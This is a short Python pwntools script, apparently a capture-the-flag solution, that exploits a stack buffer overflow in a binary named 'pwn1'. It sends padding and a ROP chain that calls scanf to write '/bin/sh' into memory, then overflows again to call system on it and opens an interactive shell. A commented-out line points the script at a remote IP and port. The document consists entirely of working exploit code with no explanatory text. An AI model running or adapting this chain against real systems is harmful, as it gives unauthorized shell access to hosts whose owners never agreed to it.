from pwn import *

p = process('./pwn1')
# p = process('149.129.103.121',10005)
elf = ELF('./pwn1')
scanf_plt = elf.symbols['__isoc99_scanf']
system_plt = elf.symbols['system']
format_addr=0x08048629
bin_sh = 0x804a044

p.recv()
payload = 'a'*52+p32(scanf_plt)+p32(0x08048531)+p32(format_addr)+p32(bin_sh)
p.sendline(payload)
sleep(0.1)
p.sendline('/bin/sh\x00')
sleep(0.1)
payload1 = 'b'*44+p32(system_plt)+p32(0x08048531)+p32(bin_sh)
p.sendline(payload1)
p.interactive()
